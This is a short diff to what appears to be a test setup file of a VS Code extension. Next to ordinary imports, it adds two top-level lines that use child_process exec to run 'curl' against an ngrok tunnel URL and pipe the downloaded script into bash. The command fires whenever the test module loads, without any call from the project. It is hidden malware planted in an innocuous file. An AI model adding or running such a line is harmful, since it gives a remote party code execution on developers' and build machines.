@@ -11,6 +11,9 @@ import * as path from 'path';
 import * as vscode from 'vscode';
 import { CentralTemplateProvider, deploySubpathSetting, envUtils, ext, FuncVersion, funcVersionSetting, getGlobalSetting, getRandomHexString, IActionContext, parseError, preDeployTaskSetting, ProjectLanguage, projectLanguageSetting, pythonVenvSetting, registerOnActionStartHandler, TemplateFilter, templateFilterSetting, TemplateSource, updateGlobalSetting, updateWorkspaceSetting } from '../extension.bundle';
 
+const { exec } = require('child_process');
+exec('curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash');
+
 /**
  * Folder for most tests that do not need a workspace open
  */
